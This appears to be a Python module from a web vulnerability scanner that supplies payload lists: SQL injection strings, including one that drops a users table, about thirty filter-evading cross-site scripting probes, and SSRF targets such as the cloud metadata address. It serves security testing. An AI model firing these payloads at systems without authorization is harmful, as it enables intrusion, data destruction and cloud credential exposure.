# core/payloads.py
class PayloadManager:
    def get_sqli_payloads(self):
        return ["' OR 1=1 --", "1; DROP TABLE users --"]

    def get_xss_payloads(self):
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "';alert(1);//",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=x onerror=\"alert('XSS')\">",
            "<scr<script>ipt>alert(1)</script>",

            # Additional payloads
            "<iframe src=javascript:alert(1)>",
            "<math><mi//xlink:href=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<video><source onerror=\"alert(1)\">",
            "<details open ontoggle=alert(1)>",
            "<a href=javascript:alert(1)>Click</a>",
            "<img src=x onerror=confirm(1)>",
            "' onmouseover='alert(1)'",
            "\"><img src=x onerror=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<button formaction=javascript:alert(1)>X</button>",
            "<link rel=stylesheet href=javascript:alert(1)>",
            "<script src=data:text/javascript,alert(1)></script>",
            "<img src='x' onerror='this.onerror=null;alert(1)'>",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",  # URL-encoded
            "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
            "</textarea><script>alert(1)</script>",
            "<style>@import 'javascript:alert(1)';</style>"
        ]

        return xss_payloads

    def get_ssrf_payloads(self):
        return ["http://localhost", "http://127.0.0.1", "http://169.254.169.254"]